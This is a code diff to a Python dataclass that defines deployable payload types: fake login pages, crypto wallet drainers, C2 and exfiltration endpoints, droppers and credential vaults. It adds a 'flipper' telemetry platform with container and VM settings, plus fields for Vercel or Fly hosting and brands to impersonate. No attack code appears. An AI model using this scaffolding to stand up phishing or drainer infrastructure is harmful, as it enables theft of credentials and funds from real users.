@@ -17,14 +17,20 @@ class PayloadDefinition:
 
     id: str
     payload_type: Literal[
-        "phishing",          # fake login page
-        "drainer",           # crypto wallet drainer
-        "malware_api",       # C2 tasking/exfil endpoint
-        "stager",            # first-stage dropper
-        "credential_vault",  # exfil ingestion + storage
-        "custom",            # anything else
+        "phishing",             # fake login page
+        "drainer",              # crypto wallet drainer
+        "malware_api",          # C2 tasking/exfil endpoint
+        "stager",               # first-stage dropper
+        "credential_vault",     # exfil ingestion + storage
+        "telemetry_platform",   # full-stack app (Express + React + Postgres) — flipper
+        "custom",               # anything else
     ]
     serve_on: Literal["vercel", "fly", "both"]
+
+    # Telemetry platform config (flipper)
+    docker_image: Optional[str] = None       # e.g. "registry.fly.io/chimera-flipper:latest"
+    vm_memory_mb: Optional[int] = None       # override default VM memory (flipper needs more)
+    vm_machine_type: Optional[str] = None    # e.g. "shared-cpu-2x" for heavier workloads
 
     # Phishing/drainer config
     target_brand: Optional[str] = None       # "microsoft", "google", "metamask", etc.
